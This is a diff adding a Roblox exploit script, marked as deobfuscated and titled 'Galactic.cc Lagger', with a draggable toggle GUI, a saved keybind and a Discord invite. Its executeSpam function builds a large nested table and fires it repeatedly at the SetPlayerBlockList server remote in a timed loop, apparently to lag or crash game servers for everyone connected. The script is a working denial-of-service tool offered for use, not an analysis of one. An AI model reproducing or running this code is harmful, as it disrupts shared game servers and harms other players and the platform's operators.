@@ -1,0 +1,446 @@
+-- [[ DEOBFUSCATED BY @mommy owner]] --
+
+-- // [1] SERVICES //
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- // [2] CONFIGURATION //
+local CONFIG = {
+    Names = {
+        ScreenGui = "GalacticGUI",
+        MainFrame = "MainFrame",
+    },
+
+    Size = {
+        MainFrame = UDim2.new(0, 220, 0, 155),
+        ToggleContainer = UDim2.new(0, 44, 0, 22),
+        ToggleKnob = UDim2.new(0, 16, 0, 16),
+        KeybindBtn = UDim2.new(0, 60, 0, 28),
+        LockBtn = UDim2.new(0, 60, 0, 22)
+    },
+
+    Position = {
+        MainFrame = UDim2.new(0, 20, 0, 20),
+        ToggleContainer = UDim2.new(1, -54, 0, 38),
+        ToggleKnobOff = UDim2.new(0, 3, 0.5, -8),
+        ToggleKnobOn = UDim2.new(1, -19, 0.5, -8),
+        KeybindBtn = UDim2.new(1, -70, 0.5, -14),
+        LockBtn = UDim2.new(1, -72, 1, -28)
+    },
+
+    Colors = {
+        MainBackground = Color3.new(0, 0, 0),
+        Stroke = Color3.new(1, 0.717647, 0.772549),
+        TextPrimary = Color3.new(1, 0.568627, 0.643137),
+        TextSecondary = Color3.new(0.627451, 0.588235, 0.607843),
+        TextMuted = Color3.new(0.509804, 0.470588, 0.490196),
+        TextWhite = Color3.new(1, 1, 1),
+        ToggleBackground = Color3.new(0.176471, 0.0980392, 0.137255),
+        ToggleKnob = Color3.new(0.705882, 0.392157, 0.509804),
+        InnerPanel = Color3.new(0.137255, 0.0980392, 0.117647)
+    },
+
+    Images = {
+        Background = "rbxassetid://103530082373030"
+    },
+
+    Strings = {
+        Title = "Galactic.cc Lagger",
+        Discord = "discord.gg/yggF6xhdUq",
+        ToggleKeyLabel = "Toggle Key:",
+        ClickToChange = "(click to change)"
+    },
+
+    Settings = {
+        DefaultKeybind = Enum.KeyCode.V,
+        CornerRadius = UDim.new(0, 12),
+        PanelCornerRadius = UDim.new(0, 6),
+        SaveFile = "IrishLagger_Keybind.txt"
+    },
+
+    Lagger = {
+        X = 2.5,
+        Y = 1,
+        Z = 0.15,
+        RemotePath = "RobloxReplicatedStorage.SetPlayerBlockList"
+    }
+}
+
+-- // [3] OBJECT REFERENCES //
+local ScreenGui
+local MainFrame
+local BackgroundImage
+local TitleLabel, StatusLabel, DiscordLabel
+local ToggleBg, ToggleKnob, ToggleHitbox
+local InnerPanel, KeybindTitle, KeybindBtn, KeybindHint
+local LockBtn
+
+local UIState = {
+    IsLagging = false,
+    IsLocked = false,
+    IsBinding = false,
+    CurrentKeybind = CONFIG.Settings.DefaultKeybind
+}
+
+-- // [4] UTILITY FUNCTIONS //
+local function getRemote(path)
+    if not path or path == "" then return nil end
+    local currentObj = game
+    local cleanPath = path:gsub("^game%.", "")
+    for segment in cleanPath:gmatch("[^%.]+") do
+        if currentObj then
+            currentObj = currentObj:FindFirstChild(segment)
+        else
+            return nil
+        end
+    end
+    return currentObj
+end
+
+local function loadSavedKeybind()
+    local success, data = pcall(readfile, CONFIG.Settings.SaveFile)
+    if success and data and data ~= "" then
+        for _, keyCode in pairs(Enum.KeyCode:GetEnumItems()) do
+            if keyCode.Name == data then
+                UIState.CurrentKeybind = keyCode
+                if KeybindBtn then
+                    KeybindBtn.Text = keyCode.Name
+                end
+                break
+            end
+        end
+    end
+end
+
+local function saveKeybind(key)
+    UIState.CurrentKeybind = key
+    KeybindBtn.Text = key.Name
+    pcall(writefile, CONFIG.Settings.SaveFile, key.Name)
+end
+
+local function updateToggleVisuals()
+    local targetPos = UIState.IsLagging and CONFIG.Position.ToggleKnobOn or CONFIG.Position.ToggleKnobOff
+    local targetText = UIState.IsLagging and "ON" or "OFF"
+    local targetColor = UIState.IsLagging and CONFIG.Colors.TextPrimary or CONFIG.Colors.TextSecondary
+
+    TweenService:Create(ToggleKnob, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Position = targetPos
+    }):Play()
+    
+    StatusLabel.Text = targetText
+    StatusLabel.TextColor3 = targetColor
+end
+
+-- // [5] GUI CREATION //
+local function createGUI()
+    -- Clean up existing interfaces
+    local plrGui = LocalPlayer:WaitForChild("PlayerGui")
+    for _, child in pairs(plrGui:GetChildren()) do
+        if child.Name == CONFIG.Names.ScreenGui then
+            child:Destroy()
+        end
+    end
+
+    -- Base GUI
+    ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = CONFIG.Names.ScreenGui
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.DisplayOrder = 20
+    ScreenGui.IgnoreGuiInset = true
+    
+    local success = pcall(function()
+        ScreenGui.Parent = CoreGui
+    end)
+    if not success then
+        ScreenGui.Parent = plrGui
+    end
+
+    -- Main Frame
+    MainFrame = Instance.new("Frame")
+    MainFrame.Name = CONFIG.Names.MainFrame
+    MainFrame.Size = CONFIG.Size.MainFrame
+    MainFrame.Position = CONFIG.Position.MainFrame
+    MainFrame.BackgroundColor3 = CONFIG.Colors.MainBackground
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Active = true
+    MainFrame.Draggable = true
+    MainFrame.ClipsDescendants = true
+    MainFrame.Parent = ScreenGui
+
+    local MainCorner = Instance.new("UICorner")
+    MainCorner.CornerRadius = CONFIG.Settings.CornerRadius
+    MainCorner.Parent = MainFrame
+
+    local MainStroke = Instance.new("UIStroke")
+    MainStroke.Color = CONFIG.Colors.Stroke
+    MainStroke.Thickness = 1
+    MainStroke.Parent = MainFrame
+
+    -- Background Image
+    BackgroundImage = Instance.new("ImageLabel")
+    BackgroundImage.Size = UDim2.new(1, 0, 1, 0)
+    BackgroundImage.Position = UDim2.new(0, 0, 0, 0)
+    BackgroundImage.BackgroundTransparency = 1
+    BackgroundImage.Image = CONFIG.Images.Background
+    BackgroundImage.ScaleType = Enum.ScaleType.Stretch
+    BackgroundImage.ImageTransparency = 0.15
+    BackgroundImage.ZIndex = 1
+    BackgroundImage.Parent = MainFrame
+
+    local BgCorner = Instance.new("UICorner")
+    BgCorner.CornerRadius = CONFIG.Settings.CornerRadius
+    BgCorner.Parent = BackgroundImage
+
+    -- Title
+    TitleLabel = Instance.new("TextLabel")
+    TitleLabel.Size = UDim2.new(1, -12, 0, 28)
+    TitleLabel.Position = UDim2.new(0, 12, 0, 6)
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Text = CONFIG.Strings.Title
+    TitleLabel.TextColor3 = CONFIG.Colors.TextPrimary
+    TitleLabel.Font = Enum.Font.GothamBlack
+    TitleLabel.TextSize = 13
+    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    TitleLabel.ZIndex = 2
+    TitleLabel.Parent = MainFrame
+
+    -- Status Label
+    StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Size = UDim2.new(0.5, 0, 0, 20)
+    StatusLabel.Position = UDim2.new(0, 12, 0, 39)
+    StatusLabel.BackgroundTransparency = 1
+    StatusLabel.Text = "OFF"
+    StatusLabel.TextColor3 = CONFIG.Colors.TextSecondary
+    StatusLabel.Font = Enum.Font.GothamBold
+    StatusLabel.TextSize = 12
+    StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    StatusLabel.ZIndex = 2
+    StatusLabel.Parent = MainFrame
+
+    -- Toggle Switch
+    ToggleBg = Instance.new("Frame")
+    ToggleBg.Size = CONFIG.Size.ToggleContainer
+    ToggleBg.Position = CONFIG.Position.ToggleContainer
+    ToggleBg.BackgroundColor3 = CONFIG.Colors.ToggleBackground
+    ToggleBg.ZIndex = 2
+    ToggleBg.Parent = MainFrame
+
+    local ToggleBgCorner = Instance.new("UICorner")
+    ToggleBgCorner.CornerRadius = UDim.new(1, 0)
+    ToggleBgCorner.Parent = ToggleBg
+
+    ToggleKnob = Instance.new("Frame")
+    ToggleKnob.Size = CONFIG.Size.ToggleKnob
+    ToggleKnob.Position = CONFIG.Position.ToggleKnobOff
+    ToggleKnob.BackgroundColor3 = CONFIG.Colors.ToggleKnob
+    ToggleKnob.ZIndex = 3
+    ToggleKnob.Parent = ToggleBg
+
+    local ToggleKnobCorner = Instance.new("UICorner")
+    ToggleKnobCorner.CornerRadius = UDim.new(1, 0)
+    ToggleKnobCorner.Parent = ToggleKnob
+
+    ToggleHitbox = Instance.new("TextButton")
+    ToggleHitbox.Size = UDim2.new(1, 0, 0, 44)
+    ToggleHitbox.Position = UDim2.new(0, 0, 0, 27)
+    ToggleHitbox.BackgroundTransparency = 1
+    ToggleHitbox.Text = ""
+    ToggleHitbox.ZIndex = 6
+    ToggleHitbox.Parent = MainFrame
+
+    -- Inner Panel (Keybind Section)
+    InnerPanel = Instance.new("Frame")
+    InnerPanel.Size = UDim2.new(1, -24, 0, 40)
+    InnerPanel.Position = UDim2.new(0, 12, 0, 68)
+    InnerPanel.BackgroundColor3 = CONFIG.Colors.InnerPanel
+    InnerPanel.BorderSizePixel = 0
+    InnerPanel.ZIndex = 2
+    InnerPanel.Parent = MainFrame
+
+    local InnerCorner = Instance.new("UICorner")
+    InnerCorner.CornerRadius = CONFIG.Settings.PanelCornerRadius
+    InnerCorner.Parent = InnerPanel
+
+    KeybindTitle = Instance.new("TextLabel")
+    KeybindTitle.Size = UDim2.new(0, 80, 1, 0)
+    KeybindTitle.Position = UDim2.new(0, 10, 0, 0)
+    KeybindTitle.BackgroundTransparency = 1
+    KeybindTitle.Text = CONFIG.Strings.ToggleKeyLabel
+    KeybindTitle.TextColor3 = CONFIG.Colors.Stroke
+    KeybindTitle.Font = Enum.Font.GothamBold
+    KeybindTitle.TextSize = 11
+    KeybindTitle.TextXAlignment = Enum.TextXAlignment.Left
+    KeybindTitle.ZIndex = 3
+    KeybindTitle.Parent = InnerPanel
+
+    KeybindBtn = Instance.new("TextButton")
+    KeybindBtn.Size = CONFIG.Size.KeybindBtn
+    KeybindBtn.Position = CONFIG.Position.KeybindBtn
+    KeybindBtn.BackgroundColor3 = CONFIG.Colors.ToggleBackground
+    KeybindBtn.Text = UIState.CurrentKeybind.Name
+    KeybindBtn.TextColor3 = CONFIG.Colors.TextWhite
+    KeybindBtn.Font = Enum.Font.GothamBold
+    KeybindBtn.TextSize = 12
+    KeybindBtn.BorderSizePixel = 0
+    KeybindBtn.ZIndex = 3
+    KeybindBtn.Parent = InnerPanel
+
+    local KeybindBtnCorner = Instance.new("UICorner")
+    KeybindBtnCorner.CornerRadius = UDim.new(0, 4)
+    KeybindBtnCorner.Parent = KeybindBtn
+
+    local KeybindBtnStroke = Instance.new("UIStroke")
+    KeybindBtnStroke.Color = CONFIG.Colors.Stroke
+    KeybindBtnStroke.Thickness = 1
+    KeybindBtnStroke.Parent = KeybindBtn
+
+    KeybindHint = Instance.new("TextLabel")
+    KeybindHint.Size = UDim2.new(0, 100, 0, 12)
+    KeybindHint.Position = UDim2.new(0, 10, 1, -14)
+    KeybindHint.BackgroundTransparency = 1
+    KeybindHint.Text = CONFIG.Strings.ClickToChange
+    KeybindHint.TextColor3 = CONFIG.Colors.TextMuted
+    KeybindHint.Font = Enum.Font.GothamMedium
+    KeybindHint.TextSize = 8
+    KeybindHint.TextXAlignment = Enum.TextXAlignment.Left
+    KeybindHint.ZIndex = 3
+    KeybindHint.Parent = InnerPanel
+
+    -- Footer
+    DiscordLabel = Instance.new("TextLabel")
+    DiscordLabel.Size = UDim2.new(0, 140, 0, 20)
+    DiscordLabel.Position = UDim2.new(0, 12, 1, -26)
+    DiscordLabel.BackgroundTransparency = 1
+    DiscordLabel.Text = CONFIG.Strings.Discord
+    DiscordLabel.TextColor3 = CONFIG.Colors.TextSecondary
+    DiscordLabel.Font = Enum.Font.GothamBold
+    DiscordLabel.TextSize = 10
+    DiscordLabel.TextXAlignment = Enum.TextXAlignment.Left
+    DiscordLabel.ZIndex = 2
+    DiscordLabel.Parent = MainFrame
+
+    LockBtn = Instance.new("TextButton")
+    LockBtn.Size = CONFIG.Size.LockBtn
+    LockBtn.Position = CONFIG.Position.LockBtn
+    LockBtn.BackgroundTransparency = 1
+    LockBtn.Text = "🔓 UNLOCK"
+    LockBtn.TextColor3 = CONFIG.Colors.Stroke
+    LockBtn.Font = Enum.Font.GothamBold
+    LockBtn.TextSize = 10
+    LockBtn.ZIndex = 2
+    LockBtn.Parent = MainFrame
+end
+
+-- // [6] FUNCTIONALITY //
+local function executeSpam(nestDepth, attempts)
+    local mainTable = {}
+    local spamTable = {}
+    table.insert(spamTable, {})
+    
+    local pointer = spamTable[1]
+    for i = 1, nestDepth do
+        local newTable = {}
+        table.insert(pointer, newTable)
+        pointer = newTable
+    end
+    
+    for i = 1, 15000 do
+        table.insert(mainTable, spamTable)
+        if i % 1000 == 0 then
+            task.wait()
+        end
+    end
+
+    local remoteInstance = getRemote(CONFIG.Lagger.RemotePath)
+    if remoteInstance then
+        for i = 1, attempts do
+            pcall(function()
+                if remoteInstance:IsA("RemoteEvent") or remoteInstance:IsA("UnreliableRemoteEvent") then
+                    remoteInstance:FireServer(mainTable)
+                elseif remoteInstance:IsA("RemoteFunction") then
+                    remoteInstance:InvokeServer(mainTable)
+                end
+            end)
+        end
+    end
+end
+
+local function runLaggerLoop()
+    while UIState.IsLagging do
+        task.spawn(function()
+            executeSpam(CONFIG.Lagger.X, CONFIG.Lagger.Y)
+        end)
+        task.wait(CONFIG.Lagger.Z)
+    end
+end
+
+local function toggleLagger()
+    UIState.IsLagging = not UIState.IsLagging
+    updateToggleVisuals()
+    
+    if UIState.IsLagging then
+        task.spawn(runLaggerLoop)
+    end
+end
+
+local function setupInteractions()
+    -- Toggle Interaction
+    ToggleHitbox.MouseButton1Click:Connect(function()
+        toggleLagger()
+    end)
+
+    -- Lock Window Dragging
+    LockBtn.MouseButton1Click:Connect(function()
+        UIState.IsLocked = not UIState.IsLocked
+        MainFrame.Draggable = not UIState.IsLocked
+        
+        if UIState.IsLocked then
+            LockBtn.Text = "🔒 LOCK"
+            LockBtn.TextColor3 = CONFIG.Colors.TextSecondary
+        else
+            LockBtn.Text = "🔓 UNLOCK"
+            LockBtn.TextColor3 = CONFIG.Colors.Stroke
+        end
+    end)
+
+    -- Keybind Assignment Button
+    KeybindBtn.MouseButton1Click:Connect(function()
+        UIState.IsBinding = true
+        KeybindBtn.Text = "..."
+        KeybindBtn.TextColor3 = CONFIG.Colors.TextPrimary
+    end)
+
+    -- Input Listener
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        -- Left Control Visibility Toggle
+        if not gameProcessed and input.KeyCode == Enum.KeyCode.LeftControl then
+            MainFrame.Visible = not MainFrame.Visible
+            return
+        end
+
+        if UIState.IsBinding then
+            if input.UserInputType == Enum.UserInputType.Keyboard then
+                local selectedKey = input.KeyCode
+                if selectedKey ~= Enum.KeyCode.Unknown then
+                    saveKeybind(selectedKey)
+                    UIState.IsBinding = false
+                end
+            end
+        elseif not gameProcessed then
+            if input.KeyCode == UIState.CurrentKeybind then
+                toggleLagger()
+            end
+        end
+    end)
+end
+
+-- // [7] INITIALIZATION //
+loadSavedKeybind()
+createGUI()
+setupInteractions()
